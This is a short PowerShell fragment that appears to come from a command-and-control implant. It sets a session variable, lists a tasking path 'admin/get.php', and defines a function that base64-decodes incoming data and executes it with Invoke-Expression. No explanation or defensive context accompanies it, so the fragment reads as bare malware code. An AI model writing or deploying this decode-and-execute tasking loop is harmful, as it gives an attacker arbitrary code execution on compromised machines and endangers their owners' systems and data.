$script:SessionID = $null
$script:TaskURIs = @('admin/get.php')
function Invoke-AgentTasking
{
    param([String]$data)
    $task = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
    IEX $task
}
